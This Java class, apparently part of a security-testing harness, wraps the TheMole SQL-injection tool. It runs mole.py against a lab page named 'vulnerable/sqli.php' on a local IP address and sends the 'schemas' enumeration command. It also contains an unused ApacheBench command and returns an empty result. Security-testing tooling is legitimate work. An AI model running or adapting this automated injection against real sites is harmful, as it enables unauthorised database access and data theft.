package com.ceprei.test.oa.st;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;

import net.sf.json.JSONObject;

/**
 * TheMole进行sql注入
 * 
 * @author lins 
 */
public class TheMolenvoker {
	public JSONObject run(JSONObject msg) {
		JSONObject result = new JSONObject();

		StringBuilder cmd = new StringBuilder();
		cmd.append("ab");
		cmd.append(" -c " + msg.getInt("t_num"));
		cmd.append(" -t " + msg.getInt("duration") * 60);
		cmd.append(" " + msg.getString("url"));
		
		StringBuilder resultStr = new StringBuilder();
		Process process = null;
		BufferedReader input = null;
		BufferedWriter output = null;
		try {
			process = Runtime
					.getRuntime()
					.exec("/home/ceprei/download/themole-0.2.6/mole.py -u 'http://192.168.0.142/vulnerable/sqli.php?id=1' -n 'admin'");
			// process.waitFor();
			// Thread.sleep(msg.getInt("duration")*60*1000+5000);
			input = new BufferedReader(new InputStreamReader(
					process.getInputStream()));
			output = new BufferedWriter(new OutputStreamWriter(process.getOutputStream()));
			String line = "";
			output.write("schemas\n");
			output.flush();
			int i = 0;
			while ((line = input.readLine()) != null) {
				System.out.println(i++ + line);
				resultStr.append(line + "<br/>");
				
			}
		} catch (Exception e) {
			e.printStackTrace();
		} finally {
			if (process != null)
				process.destroy();

			try {
				output.write("exit\n");//关闭the mole
				output.flush();
				if (input != null)
					input.close();
				if (output != null)
					output.close();
			} catch (IOException e) {
				e.printStackTrace();
			}
		}

		System.out.println(resultStr.toString());

		return result;
	}

	public static void main(String[] args) {
//		TheMolenvoker dsi = new TheMolenvoker();
//		dsi.run();
	}
}
